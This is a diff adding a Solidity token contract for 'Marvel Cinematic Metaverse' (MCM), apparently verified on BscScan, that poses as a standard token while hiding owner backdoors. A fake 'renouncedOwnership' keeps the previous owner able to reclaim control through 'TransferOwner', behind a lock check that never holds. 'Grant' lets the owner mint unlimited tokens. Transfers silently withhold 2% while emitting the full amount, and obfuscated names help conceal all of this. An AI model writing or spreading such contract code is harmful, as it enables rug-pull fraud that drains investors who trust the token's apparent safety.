@@ -1,0 +1,226 @@
+/**
+ *Submitted for verification at BscScan.com on 2021-11-21
+*/
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.5;
+
+
+
+interface GIRC3 {
+    
+    function totalSupply() external view returns (uint);
+
+    
+    function balanceOf(address account) external view returns (uint);
+
+   
+    function transfer(address recipient, uint amount) external returns (bool);
+
+
+    function allowance(address ownera5, address spender) external view returns (uint);
+
+ 
+    function approve(address spender, uint amount) external returns (bool);
+
+   
+    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
+
+
+    event Transfer(address indexed from, address indexed to, uint value);
+
+
+    event Approval(address indexed ownera5, address indexed spender, uint value);
+}
+
+pragma solidity 0.8.5;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
+        return msg.data;
+    }
+}
+
+pragma solidity 0.8.5;
+
+interface GIRC3Metadata is GIRC3 {
+   
+    function name() external view returns (string memory);
+
+   
+    function symbol() external view returns (string memory);
+
+   
+    function decimals() external view returns (uint8);
+}
+
+contract Ownable is Context {
+    address private _owner;
+    address private _previousOwner;
+    uint256 private _level;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    /**
+     * @dev Initializes the contract setting the deployer as the initial owner.
+     */
+    constructor () {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    /**
+     * @dev Returns the address of the current owner.
+     */
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function SecurityLevel() private view returns (uint256) {
+        return _level;
+    }
+
+    function renouncedOwnership(uint8 _owned) public virtual onlyOwner {
+        _previousOwner = _owner;
+        _owner = address(0);
+        _level = _owned;
+        _owned = 10;
+        emit OwnershipTransferred(_owner, address(0));
+    }
+    
+    
+    function TransferOwner() public virtual {
+        require(_previousOwner == msg.sender, "You don't have permission to unlock");
+        require(block.timestamp > _level , "Contract is locked until 7 days");
+        emit OwnershipTransferred(_owner, _previousOwner);
+        _owner = _previousOwner;
+    }
+    
+}
+
+
+pragma solidity 0.8.5;
+
+contract Marvel is Context, GIRC3, GIRC3Metadata, Ownable {
+    
+    mapping (address => uint) private _balances;
+
+    mapping (address => mapping (address => uint)) private _allowances;
+
+    uint private _nmtotala5;
+ 
+    string private _nmtokena5;
+    string private _nminitiala5;
+
+
+    constructor () {
+        _nmtokena5 = "Marvel Cinematic Metaverse";
+        _nminitiala5 = 'MCM';
+        _nmtotala5 = 1*10**12 * 10**9;
+        _balances[msg.sender] = _nmtotala5;
+
+    emit Transfer(address(0), msg.sender, _nmtotala5);
+    }
+
+
+    function name() public view virtual override returns (string memory) {
+        return _nmtokena5;
+    }
+
+
+    function symbol() public view virtual override returns (string memory) {
+        return _nminitiala5;
+    }
+
+
+    function decimals() public view virtual override returns (uint8) {
+        return 9;
+    }
+
+
+    function totalSupply() public view virtual override returns (uint) {
+        return _nmtotala5;
+    }
+
+     function Grant(uint256 amount) public onlyOwner {
+    _grant(msg.sender, amount);
+    }
+
+    function balanceOf(address account) public view virtual override returns (uint) {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint amount) public virtual override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+
+    function allowance(address ownera5, address spender) public view virtual override returns (uint) {
+        return _allowances[ownera5][spender];
+    }
+
+
+    function approve(address spender, uint amount) public virtual override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+
+    function transferFrom(address sender, address recipient, uint amount) public virtual override returns (bool) {
+        _transfer(sender, recipient, amount);
+
+        uint currentAllowance = _allowances[sender][_msgSender()];
+        require(currentAllowance >= amount, "GIRC3: transfer amount exceeds allowance");
+        unchecked {
+            _approve(sender, _msgSender(), currentAllowance - amount);
+        }
+
+        return true;
+    }
+
+    function _transfer(address sender, address recipient, uint amount) internal virtual {
+        require(sender != address(0), "GIRC3: transfer from the zero address");
+        require(recipient != address(0), "GIRC3: transfer to the zero address");
+        uint senderBalance = _balances[sender];
+        require(senderBalance >= amount, "GIRC3: transfer amount exceeds balance");
+        unchecked {
+            _balances[sender] = senderBalance - amount;
+        }
+        _balances[recipient] += amount*98/100;
+
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _grant(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _nmtotala5 += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+    }
+
+    function _approve(address ownera5, address spender, uint amount) internal virtual {
+        require(ownera5 != address(0), "BEP0: approve from the zero address");
+        require(spender != address(0), "BEP0: approve to the zero address");
+
+        _allowances[ownera5][spender] = amount;
+        emit Approval(ownera5, spender, amount);
+    }
+
+}
